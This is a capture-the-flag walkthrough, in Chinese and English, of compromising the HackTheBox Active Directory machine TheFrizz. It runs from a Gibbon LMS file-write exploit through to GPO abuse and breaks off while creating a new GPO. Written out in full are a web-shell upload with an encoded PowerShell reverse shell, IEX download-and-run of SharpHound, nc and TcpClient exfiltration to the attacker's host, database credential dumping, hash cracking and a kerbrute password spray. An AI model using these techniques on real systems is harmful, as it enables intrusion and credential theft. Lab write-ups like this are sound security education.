---
title: 'HackTheBox: TheFrizz [Active Directory]'
disqus: hackmd
---

HackTheBox: TheFrizz [Active Directory]
===

## Topic

### Lab
- HackTheBox: \
https://app.hackthebox.com/machines/TheFrizz

### Initial Enumeration

● Start Machine: `10.10.11.60`\
![image](https://hackmd.io/_uploads/BJ6EJX5exg.png)

```
┌──(chw㉿CHW)-[~]
└─$ nmap -sC -sV -Pn 10.10.11.60     
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-08 08:11 EDT
Nmap scan report for 10.10.11.60
Host is up (0.24s latency).
Not shown: 987 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
22/tcp   open  ssh           OpenSSH for_Windows_9.5 (protocol 2.0)
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Apache httpd 2.4.58 (OpenSSL/3.1.3 PHP/8.2.12)
|_http-title: Did not follow redirect to http://frizzdc.frizz.htb/home/
|_http-server-header: Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.2.12
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-05-08 19:12:15Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: frizz.htb0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: frizz.htb0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
Service Info: Hosts: localhost, FRIZZDC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-05-08T19:12:29
|_  start_date: N/A
|_clock-skew: 6h59m59s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 79.24 seconds


```
> DNS, SSH, SMB, ldap, HTTP, kpasswd5, Kerberos\
> Doman: `frizz.htb`
> HTTP: `frizzdc.frizz.htb`
> >SMB: **smb2-security-mode** `Message signing enabled and required`\
> >要求 SMB 簽章 👉🏻 不能使用 Relaying Net-NTLM

編輯 `/etc/hosts`
```
┌──(chw㉿CHW)-[~]
└─$ cat /etc/hosts                           
10.10.11.60     frizzdc.frizz.htb frizz.htb
...
```
瀏覽 http://frizzdc.frizz.htb/home/ \
![image](https://hackmd.io/_uploads/rJOkNX9gxx.png)
> 下面有一串詭異的字串：\
> ![image](https://hackmd.io/_uploads/SyMp_Xcxxl.png)\
> `V2FudCB0byBsZWFybiBoYWNraW5n IGJ1dCBkb24ndCB3YW50IHRvIGdv IHRvIGphaWw/IFlvdSdsbCBsZWFy biB0aGUgaW4ncyBhbmQgb3V0cyBv ZiBTeXNjYWxscyBhbmQgWFNTIGZy b20gdGhlIHNhZmV0eSBvZiBpbnRl cm5hdGlvbmFsIHdhdGVycyBhbmQg aXJvbiBjbGFkIGNvbnRyYWN0cyBm cm9tIHlvdXIgY3VzdG9tZXJzLCBy ZXZpZXdlZCBieSBXYWxrZXJ2aWxs ZSdzIGZpbmVzdCBhdHRvcm5leXMu`\
> (Base64 Decode)\
> `Want to learn hacking but don't want to go to jail? You'll learn the in's and outs of Syscalls and XSS from the safety of international waters and iron clad contracts from your customers, reviewed by Walkerville's finest attorneys.`\
> (繁體中文友善)\
> `想學習駭客技術但又不想坐牢？你將在國際水域的安全環境中，透過堅不可摧的合約學會 Syscalls 與 XSS，這些合約皆由 Walkerville 最優秀的律師審核。`🤔

> >view-source 沒有明顯漏洞
![image](https://hackmd.io/_uploads/rkGXUX5geg.png)


- 瀏覽 http://frizzdc.frizz.htb/home/pricing.html
![image](https://hackmd.io/_uploads/HJRRtQ9xxe.png)

- 瀏覽 http://frizzdc.frizz.htb/Gibbon-LMS/
![image](https://hackmd.io/_uploads/BJHW5mcxex.png)
>  Gibbon v25.0.00

## Solution
### 1. Search Exploit
- 搜尋 exploit-db: `Gibbon`\
![image](https://hackmd.io/_uploads/Bkhxu45egl.png)
> 若找到 credential，可嘗試利用 [Authenticated RCE](https://www.exploit-db.com/exploits/51903)

- 搜尋 Google:
![image](https://hackmd.io/_uploads/HkdTuV9ggl.png)
> CVE-2023-45878 \
> 尋找可用的 [Exploit](https://github.com/davidzzo23/CVE-2023-45878)

- ffuf path
```
┌──(chw㉿CHW)-[~]
└─$ ffuf -t 50 -r -w /usr/share/dirb/wordlists/common.txt -u http://frizzdc.frizz.htb/FUZZ -e .git,.php,.bak,.zip 
```
> 沒有可利用的資訊

### 2. CVE-2023-45878 Explot
利用 CVE-2023-45878 Explot 建立 Reverse shell
```
┌──(chw㉿CHW)-[~/Tools/CVE-exploit/CVE-2023-4587_Gibbon_v25_File_Write]
└─$ python3 CVE-2023-45878.py -t frizzdc.frizz.htb -s -i {Kali IP} -p 8888  
[+] Uploading web shell as xjfsjhmk.php...
[+] Upload successful.
[+] Sending PowerShell reverse shell payload to http://frizzdc.frizz.htb/Gibbon-LMS/xjfsjhmk.php
[*] Make sure your listener is running: nc -lvnp 8888
[+] Executing command on: http://frizzdc.frizz.htb/Gibbon-LMS/xjfsjhmk.php?cmd=powershell -NoP -NonI -W Hidden -Exec Bypass -EncodedCommand CgAgACAAIAAgACQAYwBsAGkAZQBuAHQAIAA9ACAATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBTAG8AYwBrAGUAdABzAC4AVABDAFAAQwBsAGkAZQBuAHQAKAAiADEAMAAuADEAMAAuADEANAAuADEANwA5ACIALAA4ADgAOAA4ACkAOwAKACAAIAAgACAAJABzAHQAcgBlAGEAbQAg...BQAFMAIAAnACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAJwA+ACAAJwA7AAoAIAAgACAAIAAgACAAIAAgACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsACgAgACAAIAAgACAAIAAgACAAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7AAoAIAAgACAAIAAgACAAIAAgACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApADsACgAgACAAIAAgAH0ACgAgACAAIAAgACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAAoAIAAgACAAIAA=
[!] Error connecting to web shell: HTTPConnectionPool(host='frizzdc.frizz.htb', port=80): Read timed out. (read timeout=5)

```
開啟監聽 port
```
┌──(chw㉿CHW)-[~]
└─$ nc -nvlp 8888   
listening on [any] 8888 ...
```
成功接收 Reverse shell (Medium level ?!!)
```
┌──(chw㉿CHW)-[~]
└─$ nc -nvlp 8888   
listening on [any] 8888 ...
connect to [10.10.14.179] from (UNKNOWN) [10.10.11.60] 49891
PS C:\xampp\htdocs\Gibbon-LMS> whoami
frizz\w.webservice
PS C:\xampp\htdocs\Gibbon-LMS> net user /domain

User accounts for \\FRIZZDC

-------------------------------------------------------------------------------
a.perlstein              Administrator            c.ramon                  
c.sandiego               d.hudson                 f.frizzle                
g.frizzle                Guest                    h.arm                    
J.perlstein              k.franklin               krbtgt                   
l.awesome                m.ramon                  M.SchoolBus              
p.terese                 r.tennelli               t.wright                 
v.frizzle                w.li                     w.Webservice             
The command completed successfully.

PS C:\xampp\htdocs\Gibbon-LMS> net user w.webservice
User name                    w.Webservice
Full Name                    webservice Webservice
Comment                      Service for the website
User's comment               
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            10/29/2024 7:27:04 AM
Password expires             Never
Password changeable          10/29/2024 7:27:04 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script                 
User profile                 
Home directory               
Last logon                   5/8/2025 10:03:24 AM

Logon hours allowed          All

Local Group Memberships      
Global Group memberships     *Domain Users         
The command completed successfully.

```
> 查詢 User 是為了要嘗試 AS-REP Roasting

### 3. AS-REP Roasting
找出無需 Kerberos preauthentication 的帳戶:
```
┌──(chw㉿CHW)-[~]
└─$ cat TheFrizz_name.txt 
a.perlstein
Administrator
c.ramon
c.sandiego
d.hudson
f.frizzle            
g.frizzle
Guest
h.arm
J.perlstein
k.franklin
krbtgt  
l.awesome
m.ramon
M.SchoolBus
p.terese
r.tennelli
t.wright
v.frizzle
w.li
w.Webservice

┌──(chw㉿CHW)-[~]
└─$ impacket-GetNPUsers frizz.htb/ -dc-ip 10.10.11.60 -no-pass -usersfile TheFrizz_name.txt                         
Impacket v0.13.0.dev0+20250430.174957.756ca96e - Copyright Fortra, LLC and its affiliated companies 

/usr/share/doc/python3-impacket/examples/GetNPUsers.py:165: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
  now = datetime.datetime.utcnow() + datetime.timedelta(days=1)
[-] User a.perlstein doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User c.ramon doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User c.sandiego doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User d.hudson doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User f.frizzle doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User g.frizzle doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User h.arm doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User J.perlstein doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User k.franklin doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User l.awesome doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User m.ramon doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User M.SchoolBus doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User p.terese doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User r.tennelli doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User t.wright doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User v.frizzle doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User w.li doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User w.Webservice doesn't have UF_DONT_REQUIRE_PREAUTH set
```
> 沒有找到無需 Kerberos preauthentication 的 User

>[!Tip]
>🧠：
>1. `提權`
>2. `取得 w.Webservice`，進行 Kerberoasting
>
>嘗試幾個方法都失敗
>> 沒注意可讀 `C:\xampp` 下的資料

### 4. `C:\xampp`

看到其他 Player 上傳的 Shell 🐚
![image](https://hackmd.io/_uploads/BkdYyMwbel.png)

- `C:\xampp\mysql\backup\my.ini`
![image](https://hackmd.io/_uploads/SyOUxGDZxl.png)

- `C:\xampp\mysql\README.md`
![image](https://hackmd.io/_uploads/BybQNzDZgx.png)
> MariaDB
- `C:\xampp\mysql\data\mysql\global_priv.*`
![image](https://hackmd.io/_uploads/S1O-HzDZlx.png)

- `C:\xampp\mysql\data\global_priv.MAD`
![image](https://hackmd.io/_uploads/rJ74rfP-ll.png)
```
Host: localhost
User: root
Hash: *87323B8D2F18F7090F3655A9B69B4AE2A074AB0C

Host: localhost
User: MrGibbonsDB
Hash: *65A8BE9B3524B64167F92587F87F4B3D50EB2383
```
### 5. Hashcat
```
┌──(chw㉿CHW)-[~]
└─$ cat TheFrizz_sql.hash 
87323B8D2F18F7090F3655A9B69B4AE2A074AB0C
65A8BE9B3524B64167F92587F87F4B3D50EB2383

┌──(chw㉿CHW)-[~]
└─$ hashcat -m 300 -a 0 TheFrizz_sql.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule --force 
...
```
> 天荒地老

回去繼續看 XAMPP 設定檔
- `C:\xampp\htdocs\Gibbon-LMS\config.php`
![image](https://hackmd.io/_uploads/Hko8hMPbeg.png)\
😐😐😐
> `MrGibbonsDB`:`MisterGibbs!Parrot!?1`

>[!Note]
> 雖然 Server 沒有 3389 port
> 系統中存在 `C:\xampp\mysql\bin\mysql.exe`

### 6. Mysql
```
PS C:\xampp\mysql\bin> .\mysql.exe -u MrGibbonsDB -p"MisterGibbs!Parrot!?1" -e "show databases;" 
Database
gibbon
information_schema
test

PS C:\xampp\mysql\bin> .\mysql.exe -u MrGibbonsDB -p"MisterGibbs!Parrot!?1" -D gibbon -e "show tables;"
Tables_in_gibbon
gibbonaction
gibbonactivity
gibbonactivityattendance
gibbonactivityslot
gibbonactivitystaff
gibbonactivitystudent
gibbonactivitytype
gibbonadmissionsaccount
gibbonadmissionsapplication
gibbonalarm
gibbonalarmconfirm
...
gibbonperson
gibbonpersonaldocument
gibbonpersonaldocumenttype
gibbonpersonmedical
gibbonpersonmedicalcondition
gibbonpersonmedicalconditionupdate
gibbonpersonmedicalupdate
gibbonpersonreset
gibbonpersonstatuslog
...
```
> gibbonperson: 可能會是使用者資訊

```
PS C:\xampp\mysql\bin> .\mysql.exe -u MrGibbonsDB -p"MisterGibbs!Parrot!?1" -D gibbon -e "SELECT * FROM gibbonperson;"      
gibbonPersonID  title   surname firstName       preferredName   officialName    nameInCharacters        gender  username    passwordStrong   passwordStrongSalt      passwordForceReset      status  canLogin        gibbonRoleIDPrimary     gibbonRoleIDAll      dob     email   emailAlternate  image_240       lastIPAddress   lastTimestamp   lastFailIPAddress       lastFailTimestamp    failCount       address1        address1District        address1Country address2        address2District        address2Country      phone1Type      phone1CountryCode       phone1  phone3Type      phone3CountryCode       phone3  phone2Type  phone2CountryCode        phone2  phone4Type      phone4CountryCode       phone4  website languageFirst   languageSecond  languageThird        countryOfBirth  birthCertificateScan    ethnicity       religion        profession      employer        jobTitle     emergency1Name  emergency1Number1       emergency1Number2       emergency1Relationship  emergency2Name  emergency2Number1    emergency2Number2       emergency2Relationship  gibbonHouseID   studentID       dateStart       dateEnd gibbonSchoolYearIDClassOf    lastSchool      nextSchool      departureReason transport       transportNotes  calendarFeedPersonal    viewCalendarSchool   viewCalendarPersonal    viewCalendarSpaceBooking        gibbonApplicationFormID lockerNumber    vehicleRegistration  personalBackground      messengerLastRead       privacy dayType gibbonThemeIDPersonal   gibboni18nIDPersonal    studentAgreements    googleAPIRefreshToken   microsoftAPIRefreshToken        genericAPIRefreshToken  receiveNotificationEmails   mfaSecret        mfaToken        cookieConsent   fields
0000000001      Ms.     Frizzle Fiona   Fiona   Fiona Frizzle           Unspecified     f.frizzle       067f746faca44f170c6cd9d7c4bdac6bc342c608687733f80ff784242b0b0c03     /aACFhikmNopqrRTVz2489  N       Full    Y       001     001     NULL    f.frizzle@frizz.htb  NULL    NULL    ::1     2024-10-29 09:28:59     NULL    NULL    0                                           NULL             NULL    NULL    NULL                                                    Y       Y       N       NULL        NULL     NULL    NULL    NULL    NULL    NULL                            Y       NULL    NULL    NULL

```
>`f.frizzle`:`067f746faca44f170c6cd9d7c4bdac6bc342c608687733f80ff784242b0b0c03`
> Salt: `/aACFhikmNopqrRTVz2489`

### 7. Hashcat again
>[!Note]
>[Hashcat mode](https://hashcat.net/wiki/doku.php?id=example_hashes):
>![image](https://hackmd.io/_uploads/H1jHrQvbxl.png)
```
┌──(chw㉿CHW)-[~]
└─$ cat TheFrizz_gibbon.hash
067f746faca44f170c6cd9d7c4bdac6bc342c608687733f80ff784242b0b0c03:/aACFhikmNopqrRTVz2489
┌──(chw㉿CHW)-[~]
└─$ hashcat -m 1420 -a 0 TheFrizz_gibbon.hash /usr/share/wordlists/rockyou.txt --force -O
hashcat (v6.2.6) starting
...
067f746faca44f170c6cd9d7c4bdac6bc342c608687733f80ff784242b0b0c03:/aACFhikmNopqrRTVz2489:Jenni******Magic23

```
> `f.frizzle`:`Jenni******Magic23`

1. 嘗試登入 Gibbon http://frizzdc.frizz.htb/Gibbon-LMS/ 
![image](https://hackmd.io/_uploads/ryLmJ4P-xl.png)
> 沒有可用資訊

2. 嘗試登入 SSH
```
┌──(chw㉿CHW)-[~]
└─$ ssh f.frizzle@10.10.11.60

f.frizzle@10.10.11.60: Permission denied (gssapi-with-mic,keyboard-interactive).

┌──(chw㉿CHW)-[~]
└─$ sshpass -p 'Jenni******Magic23' ssh -o PreferredAuthentications=password f.frizzle@10.10.11.60

f.frizzle@10.10.11.60: Permission denied (gssapi-with-mic,keyboard-interactive).
```
> 沒有權限登入 ?!

### 8. Kerberoasting
```
┌──(chw㉿CHW)-[~]
└─$ sudo ntpdate -u 10.10.11.60                                                      
2025-05-18 13:29:13.245591 (-0400) +25201.312121 +/- 0.169647 10.10.11.60 s1 no-leap
CLOCK: time stepped by 25201.312121

┌──(chw㉿CHW)-[~]
└─$ impacket-getTGT frizz.htb/'f.frizzle':'Jenni******Magic23' -dc-ip 10.10.11.60                              
Impacket v0.13.0.dev0+20250430.174957.756ca96e - Copyright Fortra, LLC and its affiliated companies 

Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)

```
>[!Important]
>與目標機器 時間偏差過大
> `ntpdate -u` 解決不了，系統會自動更新
> 1. `sudo su`
> 2. `timedatectl set-ntp off`: 關閉 Network Time Protocol auto-updating
> 3. `rdate -n [Target IP]`
>
> Ref: https://medium.com/@danieldantebarnes/fixing-the-kerberos-sessionerror-krb-ap-err-skew-clock-skew-too-great-issue-while-kerberoasting-b60b0fe20069

```
┌──(chw㉿CHW)-[~]
└─$ sudo su                                     

┌──(root㉿CHW)-[/home/chw]
└─# timedatectl set-ntp off

┌──(root㉿CHW)-[/home/chw]
└─# sudo ntpdate -u 10.10.11.60

2025-06-08 05:18:09.854773 (-0400) +484.270476 +/- 0.091010 10.10.11.60 s1 no-leap
CLOCK: time stepped by 484.270476
                                                        
┌──(root㉿CHW)-[/home/chw]
└─# impacket-getTGT frizz.htb/f.frizzle:Jenni******Magic23 -dc-ip 10.10.11.60 
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in f.frizzle.ccache
                                                           
┌──(root㉿CHW)-[/home/chw]
└─# export KRB5CCNAME=f.frizzle.ccache
impacket-GetUserSPNs -request -dc-ip 10.10.11.60 -dc-host frizzdc.frizz.htb -k -no-pass frizz.htb/f.frizzle
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

No entries found!

```
> `f.frizzle` 沒有 Kerberoastable 的 SPN Service

### 9. SSH
```
┌──(root㉿CHW)-[/home/chw]
└─# impacket-getTGT frizz.htb/f.frizzle:Jenni******Magic23 -dc-ip 10.10.11.60

Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in f.frizzle.ccache
┌──(root㉿CHW)-[/home/chw]
└─# KRB5CCNAME=f.frizzle.ccache ssh -K -oGSSAPIAuthentication=yes -oGSSAPIDelegateCredentials=yes f.frizzle@frizz.htb
f.frizzle@frizz.htb: Permission denied (gssapi-with-mic,keyboard-interactive).

┌──(chw㉿CHW)-[~]
└─$ KRB5CCNAME=f.frizzle.ccache ssh -vv -K -oGSSAPIAuthentication=yes -oGSSAPIDelegateCredentials=yes f.frizzle@frizzdc.frizz.htb
...
Cannot find KDC for realm "FRIZZ.HTB"
...
f.frizzle@frizzdc.frizz.htb: Permission denied (gssapi-with-mic,keyboard-interactive).
```
參考了厲害的網站
設定 `/etc/krb5.conf`，手動加入 realm 和 KDC 位置
```
┌──(chw㉿CHW)-[~]
└─$ cat /etc/krb5.conf 
[libdefaults]
  default_realm = FRIZZ.HTB
  dns_lookup_realm = false
  dns_lookup_kdc = false

[realms]
  FRIZZ.HTB = {
    kdc = 10.10.11.60
  }

[domain_realm]
  .frizz.htb = FRIZZ.HTB
  frizz.htb = FRIZZ.HTB

```
再次嘗試登入 SSH
```
┌──(chw㉿CHW)-[~]
└─$ KRB5CCNAME=/home/chw/f.frizzle.ccache ssh -vv -K -oGSSAPIAuthentication=yes -oGSSAPIDelegateCredentials=yes f.frizzle@frizzdc.frizz.htb
...
PS C:\Users\f.frizzle\Desktop> whoami
frizz\f.frizzle
PS C:\Users\f.frizzle>
```

### ✅ Get User Flag
> 在 `C:\Users\f.frizzle\Desktop` 找到 User flag

## Privileges Escalation

### 10. BloodHoud
```
┌──(chw㉿CHW)-[~/Desktop/upload_tools]
└─$ python3 -m http.server 80                                                 
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...

```
SharpHound 掃描
```
PS C:\Users\f.frizzle\Desktop> IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.71/SharpHound.ps1')
PS C:\Users\f.frizzle\Desktop> Get-Command Invoke-BloodHound

CommandType     Name                                               Version    Source
-----------     ----                                               -------    ------
Function        Invoke-BloodHound


PS C:\Users\f.frizzle\Desktop> Invoke-BloodHound -CollectionMethod All -OutputDirectory "C:\Users\f.frizzle\Desktop\"
...
```
掃描後傳回 Kali
```
PS C:\Users\f.frizzle\Desktop> (New-Object Net.WebClient).DownloadFile("http://10.10.14.71/nc.exe", "C:\Users\f.frizzle\Desktop\nc.exe")

PS C:\Users\f.frizzle\Desktop> type .\20250518152732_BloodHound.zip | .\nc.exe 10.10.14.71 55688

```
( Kali )
```
┌──(chw㉿CHW)-[~]
└─$ nc -lvnp 55688 > TheFrizz.zip
listening on [any] 55688 ...
connect to [10.10.14.71] from (UNKNOWN) [10.10.11.60] 62675
```
> TheFrizz.zip

BloodHound 分析
![image](https://hackmd.io/_uploads/BJSLMtvWel.png)
> Domain admin: `V.FRIZZLE` & `ADMINISTRATOR`

- 標記 User as Owned
![image](https://hackmd.io/_uploads/BJDrNYw-el.png)

> `f.frizzle` & `w.webservice`

- 查看 `f.frizzle` 權限
(INBOUND CONTROL RIGHTS)\
![image](https://hackmd.io/_uploads/SkhOhDz7ll.png)\
(OUTBOUND OBJECT CONTROL)\
![image](https://hackmd.io/_uploads/SJh97uzXel.png)
> 不是 Domain Admin Member 😐\
> `f.frizzle` 有 Remote Management Users 權限

- 查看 `f.frizzle` "Shortest Paths to Domain Admins from Owned Principals"
![image](https://hackmd.io/_uploads/B1fSUdzmxe.png)
> `f.frizzle` 沒有高權限 GenericAll / WriteDACL / AddMember \
> 只能 CanPSRemote 遠端登入 FRIZZDC 

沒招了🫠 參考別人 Writeup
👉🏻 `Recycle` ♻️ 🗑️ 🚮

### 11. 回收桶 ♻️ 🗑️ 🚮
建立 COM 物件 Shell.Application (操作 Windows 檔案總管介面的物件)
>[!Important]
>- `Namespace(0xA)` 代表 回收桶（Recycle Bin）
>- `Namespace(0x10)` 代表 使用者的桌面資料夾
```
$shell = New-Object -ComObject Shell.Application
$recycleBin = $shell.Namespace(0xA)
$recycleBin.Items() | Select-Object Name, Path

Name                  Path
----                  ----
wapt-backup-sunday.7z C:\$RECYCLE.BIN\S-1-5-21-2386970044-1145388522-2932701813-1103\$RE2XMEG.7z

$item = $recycleBin.Items() | Where-Object {$_.Name -eq "wapt-backup-sunday.7z"}
$desktop = (New-Object -ComObject Shell.Application).Namespace(0x10)
$desktop.MoveHere($item)
PS C:\Users\f.frizzle> ls .\Desktop\

    Directory: C:\Users\f.frizzle\Desktop

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-ar--            6/6/2025  8:19 PM             34 user.txt
-a---          10/24/2024  9:16 PM       30416987 wapt-backup-sunday.7z
```
> 找到 wapt-backup-sunday.7z 壓縮檔，移至使用者桌面

#### 11.1 回傳至 Kali
(Kali)
```
┌──(chw㉿CHW)-[~/Desktop/upload_tools]
└─$ python3 -m http.server 80 
```
(Windows)
```
PS C:\Users\f.frizzle> (New-Object Net.WebClient).DownloadFile('http://10.10.14.207/nc.exe', 'C:\Users\f.frizzle\Desktop\nc.exe')

PS C:\Users\f.frizzle> ls .\Desktop\

    Directory: C:\Users\f.frizzle\Desktop

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a---            6/8/2025  3:07 AM          38616 nc.exe
-ar--            6/6/2025  8:19 PM             34 user.txt
-a---          10/24/2024  9:16 PM       30416987 wapt-backup-sunday.7z

```
使用 nc 回傳到 Kali:\
(Kali)
```
┌──(chw㉿CHW)-[~]
└─$ nc -lvnp 55688 > wapt-backup-sunday.7z
listening on [any] 55688 ...
```
(Windows)
```
$client = New-Object System.Net.Sockets.TcpClient("10.10.14.207", 55688)
$stream = $client.GetStream()
$data = [System.IO.File]::ReadAllBytes("C:\Users\f.frizzle\Desktop\wapt-backup-sunday.7z")
$stream.Write($data, 0, $data.Length)
$stream.Close()
$client.Close()
```
#### 11.2 分析 wapt-backup-sunday.7z
```
┌──(chw㉿CHW)-[~]
└─$ 7z x wapt-backup-sunday.7z
```
![image](https://hackmd.io/_uploads/BJkFKGQXee.png)
> 在 `conf/waptserver.ini` 中找到 wapt_password
> (Base64 decode): `!suBcig@******!R`

接著尋找 PWD 對應的 User

### 12. Kerbrute passwordspray
尋找 user，透過 `net user /domain` 建立 TheFrizz_user.txt
```
PS C:\Users\f.frizzle\Desktop> net user /domain

User accounts for \\

-------------------------------------------------------------------------------
a.perlstein              Administrator            c.ramon                  
c.sandiego               d.hudson                 f.frizzle                
g.frizzle                Guest                    h.arm                    
J.perlstein              k.franklin               krbtgt                   
l.awesome                m.ramon                  M.SchoolBus              
p.terese                 r.tennelli               t.wright                 
v.frizzle                w.li                     w.Webservice             
The command completed with one or more errors.

PS C:\Users\f.frizzle\Desktop>
```
進行 passwordspray
```
┌──(chw㉿CHW)-[~]
└─$ cat TheFrizz_user.txt           
a.perlstein
Administrator
c.ramon
c.sandiego
d.hudson
f.frizzle
g.frizzle
...

┌──(chw㉿CHW)-[~]
└─$ kerbrute passwordspray -d frizz.htb --dc 10.10.11.60 \TheFrizz_user.txt '!suBcig@******!R'


    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (n/a) - 06/08/25 - Ronnie Flathers @ropnop

2025/06/08 17:30:57 >  Using KDC(s):
2025/06/08 17:30:57 >   10.10.11.60:88

2025/06/08 17:31:01 >  [+] VALID LOGIN:  M.SchoolBus@frizz.htb:!suBcig@******!R
2025/06/08 17:31:01 >  Done! Tested 21 logins (1 successes) in 3.739 seconds
```
> `M.SchoolBus@frizz.htb`:`!suBcig@******!R`

#### 12.1 確認 M.SchoolBus 可執行

```
┌──(chw㉿CHW)-[~]
└─$ impacket-getTGT frizz.htb/M.SchoolBus:'!suBcig@******!R' -dc-ip 10.10.11.60

Impacket v0.13.0.dev0+20250430.174957.756ca96e - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in M.SchoolBus.ccache
                        
┌──(chw㉿CHW)-[~]
└─$ KRB5CCNAME=/home/chw/M.SchoolBus.ccache ssh -K -oGSSAPIAuthentication=yes -oGSSAPIDelegateCredentials=yes M.SchoolBus@frizzdc.frizz.htb
PowerShell 7.4.5
PS C:\Users\M.SchoolBus> 
PS C:\Users\M.SchoolBus>
```

### 13. Bloodhound
回到 BloodHound
- 標記 `M.SchoolBus` as Owned
![image](https://hackmd.io/_uploads/HJr3MXQ7xl.png)

- 查看 `M.SchoolBus` 權限
(INBOUND CONTROL RIGHTS)\
![image](https://hackmd.io/_uploads/BygVmQQ7ge.png)\
(OUTBOUND OBJECT CONTROL)\
![image](https://hackmd.io/_uploads/Sk-O7Q77xg.png)

- 查看 `f.frizzle` "Shortest Paths to Domain Admins from Owned Principals"
![image](https://hackmd.io/_uploads/BkJH7xN7el.png)


### 14. Group Policy Object (GPO) Abuse
#### 14.1 確認 Group 權限
```
PS C:\Users\M.SchoolBus\Desktop> ls

    Directory: C:\Users\M.SchoolBus\Desktop

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a---            6/8/2025  3:52 PM          80896 SharpGPOAbuse.exe

PS C:\Users\M.SchoolBus\Desktop> whoami /groups

GROUP INFORMATION
-----------------

Group Name                                   Type             SID                                            Attributes                             
                        
============================================ ================ ============================================== ===============================================================
Everyone                                     Well-known group S-1-1-0                                        Mandatory group, Enabled by default, Enabled group             
BUILTIN\Remote Management Users              Alias            S-1-5-32-580                                   Mandatory group, Enabled by default, Enabled group             
BUILTIN\Users                                Alias            S-1-5-32-545                                   Mandatory group, Enabled by default, Enabled group
...
NT AUTHORITY\Authenticated Users             Well-known group S-1-5-11                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization               Well-known group S-1-5-15                                       Mandatory group, Enabled by default, Enabled group
frizz\Desktop Admins                         Group            S-1-5-21-2386970044-1145388522-2932701813-1121 Mandatory group, Enabled by default, Enabled group
frizz\Group Policy Creator Owners            Group            S-1-5-21-2386970044-1145388522-2932701813-520  Mandatory group, Enabled by default, Enabled group
Authentication authority asserted identity   Well-known group S-1-18-1                                       Mandatory group, Enabled by default, Enabled group
frizz\Denied RODC Password Replication Group Alias            S-1-5-21-2386970044-1145388522-2932701813-572  Mandatory group, Enabled by default, Enabled group, Local Group
Mandatory Label\Medium Mandatory Level       Label            S-1-16-8192  
```
> `frizz\Group Policy Creator Owners`: frizz 內建群組的成員，可嘗試創建惡意 GPO

#### 14.2 創建 New-GPO

>[!Note]
>`New-GPO -Name <name> `：\
